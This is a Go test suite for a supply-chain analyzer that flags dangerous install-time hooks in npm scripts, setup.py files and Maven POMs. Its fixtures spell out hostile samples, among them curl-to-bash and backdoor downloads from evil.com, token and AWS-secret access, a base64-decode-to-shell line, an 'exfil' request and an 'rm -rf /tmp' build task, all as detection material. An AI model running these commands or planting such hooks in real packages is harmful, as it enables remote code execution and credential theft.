package analyzer

import (
	"strings"
	"testing"
)

// ============================================================
// AnalyzeNPMScripts Tests
// ============================================================

// Test: No dangerous patterns in standard npm lifecycle scripts
// Justification: Build tools (jest, webpack, node index.js) execute in developer
//                environments, not at install time. Absence of install hooks is a
//                positive supply chain hygiene signal.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) - confirms
//         install-time hooks (preinstall/install/postinstall) as the primary npm
//         attack vector; non-install scripts are out of scope.
// Methodology: Pass standard build/test/start scripts to AnalyzeNPMScripts
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeNPMScripts_NoDangerousPatterns(t *testing.T) {
	scripts := map[string]string{
		"test":  "jest",
		"build": "webpack",
		"start": "node index.js",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if analysis.HasDangerousPatterns {
		t.Error("Expected no dangerous patterns for benign scripts")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) != 0 {
		t.Errorf("Expected 0 dangerous patterns, got %d", len(analysis.DangerousPatterns))
	}
}

// Test: AnalyzeNPMScripts only evaluates install-time hooks, not all scripts
// Justification: npm only executes preinstall/install/postinstall during package
//                installation. Dangerous code in test/build/start scripts cannot
//                compromise a user's machine at install time.
// Source: npm lifecycle documentation; "Backstabber's Knife Collection" (Ohm et al., 2020)
//         Section 3.2 identifies postinstall as the dominant attack vector.
// Methodology: Place curl|bash and eval patterns in non-install scripts only;
//              verify AnalyzeNPMScripts ignores them.
// Result: Expects HasDangerousPatterns=false — dangerous content in non-install
//         scripts must not raise an alert.
func TestAnalyzeNPMScripts_IgnoresNonInstallScripts(t *testing.T) {
	scripts := map[string]string{
		"test":  "curl http://example.com | bash",
		"build": "eval(malicious_code)",
		"start": "wget http://example.com/script.sh",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if analysis.HasDangerousPatterns {
		t.Errorf("Non-install scripts should be ignored; got patterns: %v", analysis.DangerousPatterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for non-install scripts, got %s", analysis.RiskLevel)
	}
}

// Test: Empty scripts map returns no risk
// Justification: A package with no scripts at all cannot execute arbitrary code
//                at install time; this is the safest possible state.
// Source: OSSF Scorecard — absence of install hooks scores highest for this category.
// Methodology: Pass empty map to AnalyzeNPMScripts
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeNPMScripts_EmptyMap(t *testing.T) {
	analysis := AnalyzeNPMScripts(map[string]string{})

	if analysis.HasDangerousPatterns {
		t.Error("Empty scripts map should not produce dangerous patterns")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for empty scripts, got %s", analysis.RiskLevel)
	}
}

// Test: curl piped to bash in a postinstall hook
// Justification: Downloading and immediately executing a remote shell script is the
//                canonical supply chain compromise technique. The attacker controls
//                both the URL and the executed payload; no user confirmation occurs.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — most common
//         npm malware technique (Table 2).
// Methodology: Pass postinstall hook with curl|bash to AnalyzeNPMScripts
// Result: Expects HIGH risk and the "curl/wget | bash" pattern to be detected
func TestAnalyzeNPMScripts_CurlPipeBash(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "curl https://evil.com/script.sh | bash",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}
	if len(analysis.DangerousPatterns) == 0 {
		t.Error("Expected at least one dangerous pattern")
	}

	foundCurlBash := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "curl/wget | bash" {
			foundCurlBash = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity for curl | bash, got %s", p.Severity)
			}
		}
	}
	if !foundCurlBash {
		t.Error("Expected to find 'curl/wget | bash' pattern")
	}
}

// Test: eval() in a preinstall hook
// Justification: eval() executes arbitrary strings as code. In install hooks this
//                enables a compromised package to run attacker-controlled logic
//                derived from the environment or a remote source at install time.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — eval of
//         child_process output is a documented npm attack pattern.
// Methodology: Pass preinstall hook containing eval() to AnalyzeNPMScripts
// Result: Expects HIGH risk and "eval()" pattern detected
func TestAnalyzeNPMScripts_EvalUsage(t *testing.T) {
	scripts := map[string]string{
		"preinstall": "eval(require('child_process').execSync('whoami'))",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["eval()"] {
		t.Error("Expected to find 'eval()' pattern")
	}
}

// Test: Sensitive environment variable access in postinstall hook
// Justification: Accessing CI/CD secrets (NPM_TOKEN, AWS_SECRET_ACCESS_KEY) in an
//                install hook enables credential exfiltration. This mirrors the
//                event-stream attack (2018) which harvested bitcoin wallet keys.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — credential theft
//         via environment variables is a documented npm attack category.
// Methodology: Pass postinstall script accessing $NPM_TOKEN and AWS_SECRET_ACCESS_KEY
// Result: Expects "sensitive env access" pattern with HIGH severity
func TestAnalyzeNPMScripts_SensitiveEnvAccess(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "echo $NPM_TOKEN && process.env.AWS_SECRET_ACCESS_KEY",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundEnvAccess := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "sensitive env access" {
			foundEnvAccess = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !foundEnvAccess {
		t.Error("Expected to find sensitive env access pattern")
	}
}

// Test: Base64-encoded payload decoded and executed in install hook
// Justification: Base64 encoding is used by attackers to obfuscate malicious payloads
//                from static scanners. The decode-then-execute pattern is a classic
//                obfuscation technique documented in real npm attacks.
// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — obfuscation via
//         encoding is a common evasion technique.
// Methodology: Pass install script with base64 -d piped to sh
// Result: Expects "base64 decode" pattern to be detected
func TestAnalyzeNPMScripts_Base64Decode(t *testing.T) {
	scripts := map[string]string{
		"install": "echo 'ZXZpbCBjb2Rl' | base64 -d | sh",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundBase64 := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "base64 decode" {
			foundBase64 = true
		}
	}
	if !foundBase64 {
		t.Error("Expected to find base64 decode pattern")
	}
}

// Test: HTTP download of an executable in postinstall hook
// Justification: Downloading executables over unencrypted HTTP allows MITM attacks
//                in addition to the risk of running attacker-supplied binaries.
//                Executable file extensions (.exe, .sh, .dll, .so) confirm the
//                intent to run the downloaded file.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — binary payload
//         download is a documented npm attack pattern.
// Methodology: Pass postinstall script with wget over HTTP targeting a .exe file
// Result: Expects HIGH risk and either HTTP download or executable download pattern
func TestAnalyzeNPMScripts_HTTPDownload(t *testing.T) {
	scripts := map[string]string{
		"postinstall": "wget http://insecure.com/malware.exe",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["HTTP download"] && !patterns["executable download"] {
		t.Error("Expected to find HTTP or executable download pattern")
	}
}

// Test: Real-world JavaScript package with clean install lifecycle
// Justification: Validates the analyzer does not produce false positives on legitimate
//                npm packages. Standard scripts (start, dev, test) cannot execute
//                at install time and must not raise supply chain risk alerts.
// Source: OSSF Scorecard methodology — only install-time hooks are scored as
//         Category 4 (Install Execution) risk.
// Methodology: Use scripts extracted from /Users/mike/Projects/mike-libraries/javascript/package.json
//              which has start/dev/test hooks but no preinstall/install/postinstall.
// Result: Expects HasDangerousPatterns=false (no install hooks present in this package)
func TestAnalyzeNPMScripts_RealWorldJavaScriptPackage(t *testing.T) {
	// Scripts from /Users/mike/Projects/mike-libraries/javascript/package.json
	scripts := map[string]string{
		"start": "node app.js",
		"dev":   "nodemon app.js",
		"test":  "jest",
	}

	analysis := AnalyzeNPMScripts(scripts)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive: legitimate package flagged. Patterns: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for legitimate package, got %s", analysis.RiskLevel)
	}
}

// ============================================================
// AnalyzePythonSetup Tests
// ============================================================

// Test: Clean setup.py with no dangerous patterns
// Justification: A standard setuptools setup() with no custom cmdclass and no
//                network requests is the expected baseline for safe packages.
// Source: OSSF Scorecard — absence of install-time code execution as a positive signal.
// Methodology: Pass minimal setup.py content to AnalyzePythonSetup
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzePythonSetup_NoPatterns(t *testing.T) {
	setupContent := `
from setuptools import setup, find_packages

setup(
    name='mypackage',
    version='1.0.0',
    packages=find_packages(),
)
`

	analysis := AnalyzePythonSetup(setupContent)

	if analysis.HasDangerousPatterns {
		t.Error("Expected no dangerous patterns for benign setup.py")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

// Test: cmdclass override that executes a remote script
// Justification: Overriding setuptools command classes allows arbitrary code
//                execution during pip install. This pattern was used in the
//                "colourama" and other supply chain attacks to bypass naive scanning.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — cmdclass
//         override is a documented PyPI attack vector (Table 3).
// Methodology: Pass setup.py with CustomInstall(install) executing curl|sh to
//              AnalyzePythonSetup
// Result: Expects "cmdclass override" and "curl/wget | bash" patterns detected
func TestAnalyzePythonSetup_CmdClassOverride(t *testing.T) {
	setupContent := `
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        import os
        os.system('curl http://evil.com/backdoor.sh | sh')
        install.run(self)

setup(
    name='evil-package',
    cmdclass={'install': CustomInstall},
)
`

	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["cmdclass override"] {
		t.Error("Expected to find cmdclass override pattern")
	}
	if !patterns["curl/wget | bash"] {
		t.Error("Expected to find curl | bash pattern")
	}
}

// Test: Network requests imported and used during setup execution
// Justification: A setup.py that makes outbound HTTP requests during installation
//                can exfiltrate environment data (hostname, user, installed packages)
//                or fetch additional malicious payloads.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — data exfiltration
//         via HTTP from setup.py is documented as an attack pattern.
// Methodology: Pass setup.py importing requests and calling requests.get() over HTTP
// Result: Expects "network import" and "HTTP download" patterns detected
func TestAnalyzePythonSetup_NetworkImport(t *testing.T) {
	setupContent := `
import requests
from setuptools import setup

response = requests.get('http://evil.com/config.json')
setup(name='evil', version='1.0')
`

	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundNetworkImport := false
	foundHTTPDownload := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "network import" {
			foundNetworkImport = true
		}
		if p.Pattern == "HTTP download" {
			foundHTTPDownload = true
		}
	}
	if !foundNetworkImport {
		t.Error("Expected to find network import pattern")
	}
	if !foundHTTPDownload {
		t.Error("Expected to find HTTP download pattern")
	}
}

// Test: Dynamic __import__() call in setup.py
// Justification: __import__() bypasses static import analysis and allows a
//                compromised package to load arbitrary modules at install time,
//                including modules that execute malicious payloads.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — dynamic import
//         is a documented obfuscation and evasion technique.
// Methodology: Pass setup.py with __import__() call to AnalyzePythonSetup
// Result: Expects "__import__" pattern detected with MEDIUM severity
func TestAnalyzePythonSetup_DynamicImport(t *testing.T) {
	setupContent := `
from setuptools import setup

mod = __import__('subprocess')
mod.call(['curl', 'http://evil.com/exfil'])

setup(name='evil', version='1.0')
`

	analysis := AnalyzePythonSetup(setupContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundDynImport := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "__import__" {
			foundDynImport = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity for __import__, got %s", p.Severity)
			}
		}
	}
	if !foundDynImport {
		t.Error("Expected to find __import__ pattern")
	}
}

// Test: Real-world Python application code produces no false positives
// Justification: Validates the analyzer correctly handles legitimate Flask/SQLAlchemy
//                application code. Python app files use os.getenv() with non-sensitive
//                keys (REDIS_HOST, REDIS_PORT) which must not trigger supply chain alerts.
// Source: OSSF Scorecard methodology — only install-time setup.py patterns are
//         relevant for Category 4 (Install Execution) risk.
// Methodology: Pass app.py content from /Users/mike/Projects/mike-libraries/python/app.py
//              to AnalyzePythonSetup; the file has no dangerous install-time patterns.
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzePythonSetup_RealWorldCleanApp(t *testing.T) {
	// Content from /Users/mike/Projects/mike-libraries/python/app.py
	// Flask web app using SQLAlchemy, Redis, dotenv — no install-time execution
	appContent := `
from flask import Flask, jsonify, request
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import redis
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

redis_client = redis.Redis(
    host=os.getenv('REDIS_HOST', 'localhost'),
    port=int(os.getenv('REDIS_PORT', 6379)),
    decode_responses=True
)

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
`

	analysis := AnalyzePythonSetup(appContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive on legitimate Flask app. Patterns found: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for legitimate app, got %s", analysis.RiskLevel)
	}
}

// ============================================================
// AnalyzeJavaPOM Tests
// ============================================================

// Test: Clean pom.xml with no dangerous plugins
// Justification: A pom.xml without exec/antrun/groovy plugins cannot execute
//                arbitrary code during the build lifecycle. This is the baseline
//                safe state for Maven packages.
// Source: OSSF Scorecard — absence of arbitrary code execution plugins as a
//         positive supply chain hygiene signal.
// Methodology: Pass minimal pom.xml without build plugins to AnalyzeJavaPOM
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeJavaPOM_NoPlugins(t *testing.T) {
	pomContent := `
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.example</groupId>
  <artifactId>myapp</artifactId>
  <version>1.0.0</version>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		t.Error("Expected no dangerous patterns for POM without plugins")
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

// Test: maven-exec-plugin bound to install phase executes curl
// Justification: maven-exec-plugin allows executing arbitrary system commands
//                during the Maven build lifecycle. Binding to the install phase
//                means it runs when a developer runs `mvn install`, enabling
//                credential theft or backdoor installation.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — build-tool
//         plugin abuse is documented as a Java supply chain attack vector.
// Methodology: Pass pom.xml with maven-exec-plugin in install phase to AnalyzeJavaPOM
// Result: Expects HIGH risk and "maven-exec-plugin" pattern detected
func TestAnalyzeJavaPOM_MavenExecPlugin(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>maven-exec-plugin</artifactId>
        <executions>
          <execution>
            <phase>install</phase>
            <goals>
              <goal>exec</goal>
            </goals>
            <configuration>
              <executable>curl</executable>
              <arguments>
                <argument>http://evil.com/backdoor.sh</argument>
              </arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}
	if analysis.RiskLevel != "HIGH" {
		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
	}

	patterns := make(map[string]bool)
	for _, p := range analysis.DangerousPatterns {
		patterns[p.Pattern] = true
	}
	if !patterns["maven-exec-plugin"] {
		t.Error("Expected to find maven-exec-plugin pattern")
	}
}

// Test: maven-antrun-plugin with exec task bound to compile phase
// Justification: maven-antrun-plugin executes Ant tasks during build, including
//                <exec> tasks that run arbitrary system commands. Binding to the
//                compile phase means execution before the artifact is even built,
//                making this an early-stage compromise vector.
// Source: SLSA framework threat model — arbitrary command execution in build
//         scripts is a Category L2 build integrity threat.
// Methodology: Pass pom.xml with antrun plugin running rm -rf /tmp in compile phase
// Result: Expects "maven-antrun-plugin" (HIGH) and "lifecycle execution" patterns
func TestAnalyzeJavaPOM_AntRunPlugin(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <phase>compile</phase>
            <goals>
              <goal>run</goal>
            </goals>
            <configuration>
              <tasks>
                <exec executable="rm">
                  <arg value="-rf"/>
                  <arg value="/tmp"/>
                </exec>
              </tasks>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundAntRun := false
	foundLifecycle := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "maven-antrun-plugin" {
			foundAntRun = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
		if p.Pattern == "lifecycle execution" {
			foundLifecycle = true
		}
	}
	if !foundAntRun {
		t.Error("Expected to find maven-antrun-plugin pattern")
	}
	if !foundLifecycle {
		t.Error("Expected to find lifecycle execution pattern")
	}
}

// Test: groovy-maven-plugin allows dynamic scripting in build
// Justification: Groovy is a JVM scripting language with full access to the Java
//                runtime. A groovy-maven-plugin configuration can execute arbitrary
//                Java/Groovy code during the build, including network calls and
//                file system operations.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — dynamic language
//         execution during build is a documented supply chain risk.
// Methodology: Pass pom.xml with groovy-maven-plugin to AnalyzeJavaPOM
// Result: Expects "groovy-maven-plugin" detected with MEDIUM severity
func TestAnalyzeJavaPOM_GroovyPlugin(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.gmaven</groupId>
        <artifactId>groovy-maven-plugin</artifactId>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns to be detected")
	}

	foundGroovy := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "groovy-maven-plugin" {
			foundGroovy = true
			if p.Severity != "MEDIUM" {
				t.Errorf("Expected MEDIUM severity, got %s", p.Severity)
			}
		}
	}
	if !foundGroovy {
		t.Error("Expected to find groovy-maven-plugin pattern")
	}
}

// Test: Lifecycle phase binding without dangerous plugin does not raise alert
// Justification: Lifecycle phase references (<phase>compile</phase>) are only
//                a concern when combined with a dangerous plugin. A pom.xml that
//                mentions lifecycle phases in standard plugin configuration (e.g.
//                spring-boot-maven-plugin) must not produce false positives.
// Source: SLSA framework — lifecycle binding is only a risk indicator when
//         paired with a code-execution plugin.
// Methodology: Pass pom.xml with phase references but only spring-boot-maven-plugin
// Result: Expects HasDangerousPatterns=false (no dangerous plugins present)
func TestAnalyzeJavaPOM_LifecyclePhaseSafePlugin(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-maven-plugin</artifactId>
        <executions>
          <execution>
            <phase>compile</phase>
            <goals><goal>repackage</goal></goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		t.Errorf("spring-boot-maven-plugin should not be flagged; got: %v", analysis.DangerousPatterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

// Test: Real-world Spring Boot pom.xml with only standard plugins
// Justification: Validates the analyzer does not produce false positives on a
//                standard Spring Boot project POM. The spring-boot-maven-plugin
//                is a mainstream build tool that does not execute arbitrary code.
// Source: OSSF Scorecard methodology — only dangerous build plugins are scored
//         as supply chain risks; standard framework plugins are expected.
// Methodology: Use pom.xml from /Users/mike/Projects/mike-libraries/java/pom.xml
//              which uses only spring-boot-maven-plugin.
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeJavaPOM_RealWorldSpringBootPOM(t *testing.T) {
	// Build section from /Users/mike/Projects/mike-libraries/java/pom.xml
	// Only spring-boot-maven-plugin present — no exec/antrun/groovy plugins
	pomContent := `
<project>
  <modelVersion>4.0.0</modelVersion>
  <parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.1</version>
  </parent>
  <groupId>com.example</groupId>
  <artifactId>java-app</artifactId>
  <version>1.0.0</version>
  <build>
    <plugins>
      <plugin>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-maven-plugin</artifactId>
        <configuration>
          <excludes>
            <exclude>
              <groupId>org.projectlombok</groupId>
              <artifactId>lombok</artifactId>
            </exclude>
          </excludes>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive on standard Spring Boot POM. Patterns found: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for standard Spring Boot project, got %s", analysis.RiskLevel)
	}
}

// ============================================================
// AnalyzeJavaPOM Context-Aware Tests
// ============================================================

// Test: exec-maven-plugin running Java main class (JMH benchmarks) is not flagged
// Justification: exec-maven-plugin with <mainClass> runs a Java class in the JVM,
//                which is a standard build operation (benchmarks, code generators,
//                integration test launchers). This does not indicate supply chain risk.
// Source: OSSF Scorecard methodology — standard build tool usage should not
//         produce false positives.
// Methodology: Pass pom.xml with exec-maven-plugin using <mainClass> for JMH
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeJavaPOM_ExecPluginWithMainClass(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <executions>
          <execution>
            <phase>test</phase>
            <goals>
              <goal>java</goal>
            </goals>
            <configuration>
              <mainClass>org.openjdk.jmh.Main</mainClass>
              <arguments>
                <argument>.*</argument>
              </arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive on exec-maven-plugin with mainClass. Patterns found: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for JMH benchmark execution, got %s", analysis.RiskLevel)
	}
}

// Test: exec-maven-plugin running java executable is not flagged
// Justification: <executable>java</executable> runs the Java runtime, which is
//                a standard build tool. This pattern is used for integration tests,
//                code generation, and other build-time Java execution.
// Source: OSSF Scorecard — standard build tool invocation is not a risk signal.
// Methodology: Pass pom.xml with exec-maven-plugin using <executable>java</executable>
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeJavaPOM_ExecPluginWithJavaExecutable(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <configuration>
          <executable>java</executable>
          <arguments>
            <argument>-jar</argument>
            <argument>target/app.jar</argument>
          </arguments>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive on exec-maven-plugin with java executable. Patterns found: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
	}
}

// Test: maven-antrun-plugin with only file operations is not flagged
// Justification: maven-antrun-plugin used for mkdir, copy, and echo is standard
//                build scaffolding. Spring and other frameworks use antrun for
//                resource copying and directory setup without any supply chain risk.
// Source: SLSA framework — file manipulation during build is a normal build
//         operation, not a supply chain threat.
// Methodology: Pass pom.xml with antrun using only mkdir/copy/echo tasks
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeJavaPOM_AntRunPluginSafeFileOps(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <phase>generate-resources</phase>
            <goals>
              <goal>run</goal>
            </goals>
            <configuration>
              <target>
                <mkdir dir="${project.build.directory}/generated"/>
                <copy todir="${project.build.directory}/resources">
                  <fileset dir="src/main/resources"/>
                </copy>
                <echo message="Resources copied successfully"/>
              </target>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive on antrun with safe file ops. Patterns found: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for safe antrun file operations, got %s", analysis.RiskLevel)
	}
}

// Test: maven-antrun-plugin with <get> download task is flagged
// Justification: Ant's <get> task downloads files from URLs during build.
//                This is a direct supply chain risk vector — an attacker could
//                modify the POM to download malicious binaries during build.
// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — downloading
//         external resources during build is a documented attack vector.
// Methodology: Pass pom.xml with antrun using <get> to download a file
// Result: Expects HIGH risk and "maven-antrun-plugin" pattern detected
func TestAnalyzeJavaPOM_AntRunPluginGetTask(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <phase>generate-resources</phase>
            <goals>
              <goal>run</goal>
            </goals>
            <configuration>
              <target>
                <get src="https://example.com/binary.jar" dest="${project.build.directory}/lib/binary.jar"/>
              </target>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if !analysis.HasDangerousPatterns {
		t.Error("Expected dangerous patterns for antrun with <get> download task")
	}

	found := false
	for _, p := range analysis.DangerousPatterns {
		if p.Pattern == "maven-antrun-plugin" {
			found = true
			if p.Severity != "HIGH" {
				t.Errorf("Expected HIGH severity, got %s", p.Severity)
			}
		}
	}
	if !found {
		t.Error("Expected maven-antrun-plugin pattern to be detected")
	}
}

// Test: maven-antrun-plugin with safe exec (java) is not flagged
// Justification: Running java via Ant's <exec> task is a standard build operation
//                (e.g., running annotation processors, code generators). The executable
//                being java means it's running JVM code, not arbitrary commands.
// Source: OSSF Scorecard — standard build tool invocation is not a risk signal.
// Methodology: Pass pom.xml with antrun using <exec executable="java">
// Result: Expects HasDangerousPatterns=false and RiskLevel=LOW
func TestAnalyzeJavaPOM_AntRunPluginSafeExec(t *testing.T) {
	pomContent := `
<project>
  <build>
    <plugins>
      <plugin>
        <artifactId>maven-antrun-plugin</artifactId>
        <executions>
          <execution>
            <phase>generate-sources</phase>
            <goals>
              <goal>run</goal>
            </goals>
            <configuration>
              <target>
                <exec executable="java">
                  <arg value="-jar"/>
                  <arg value="tools/codegen.jar"/>
                </exec>
              </target>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
`

	analysis := AnalyzeJavaPOM(pomContent)

	if analysis.HasDangerousPatterns {
		patterns := []string{}
		for _, p := range analysis.DangerousPatterns {
			patterns = append(patterns, p.Pattern+": "+p.Match)
		}
		t.Errorf("False positive on antrun with safe java exec. Patterns found: %v", patterns)
	}
	if analysis.RiskLevel != "LOW" {
		t.Errorf("Expected LOW risk level for safe antrun java exec, got %s", analysis.RiskLevel)
	}
}

